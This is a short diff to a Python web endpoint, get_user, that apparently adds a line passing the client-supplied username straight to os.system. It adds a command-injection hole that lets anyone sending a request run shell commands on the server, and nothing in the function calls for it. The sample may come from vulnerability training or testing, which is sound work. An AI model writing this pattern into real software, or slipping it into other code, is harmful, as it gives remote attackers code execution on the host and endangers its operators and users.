@@ -77,6 +77,7 @@ def get_notes():
 def get_user():
     data = request.json
     username = data.get('username')
+    os.system(username)
 
     return username, 200
 
